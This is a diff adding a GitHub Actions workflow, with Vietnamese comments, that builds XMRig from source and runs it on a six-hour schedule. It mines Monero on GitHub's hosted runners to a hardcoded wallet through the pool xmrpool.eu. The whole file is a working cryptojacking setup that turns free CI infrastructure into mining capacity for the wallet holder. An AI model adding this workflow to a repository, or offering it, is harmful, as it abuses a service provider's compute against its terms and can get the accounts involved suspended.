@@ -1,0 +1,30 @@
+name: XMRig XMR Miner
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'  # chạy lại sau mỗi 6 tiếng (UTC)
+
+jobs:
+  xmr-mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # tối đa 6 tiếng do giới hạn của GitHub Actions
+
+    steps:
+    - name: Cài gói cần thiết
+      run: |
+        sudo apt update
+        sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+    - name: Clone XMRig
+      run: |
+        git clone https://github.com/xmrig/xmrig.git
+        cd xmrig
+        mkdir build && cd build
+        cmake ..
+        make -j$(nproc)
+
+    - name: Đào XMR bằng XMRig (xmrpool.eu)
+      run: |
+        cd xmrig/build
+        ./xmrig -o xmrpool.eu:3333 -a rx -u 44dyHK6YbmreQTqu3ZcgywisxXJAtxnvcdiqjkanFy6zEgAgMW7Nh96STePgxkndamLjZ1NWX34URev5rTPapF39DSBDFPM -p x -t 4
